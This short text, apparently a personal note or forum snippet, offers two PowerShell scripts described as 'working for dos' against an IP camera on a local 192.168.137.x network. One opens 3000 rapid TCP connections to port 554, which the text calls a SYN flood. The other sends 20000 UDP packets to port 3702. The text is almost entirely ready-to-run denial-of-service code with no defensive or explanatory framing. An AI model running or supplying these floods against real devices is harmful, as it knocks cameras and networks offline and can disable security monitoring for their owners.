These commands are working for dos:
SYN flood::
$camIp = "192.168.137.<camera_ip>"
1..3000 | ForEach-Object {
    try {
        $tcp = New-Object System.Net.Sockets.TcpClient
        $tcp.BeginConnect($camIp, 554, $null, $null) | Out-Null
        $tcp.Close()
    } catch {}
}
UDP flood::
$camIp = "192.168.137.<camera_ip>"
$udp = New-Object System.Net.Sockets.UdpClient
$bytes = [byte[]](1..1000 | ForEach-Object { 0 })
1..20000 | ForEach-Object { $udp.Send($bytes, $bytes.Length, $camIp, 3702) | Out-Null }
$udp.Close()
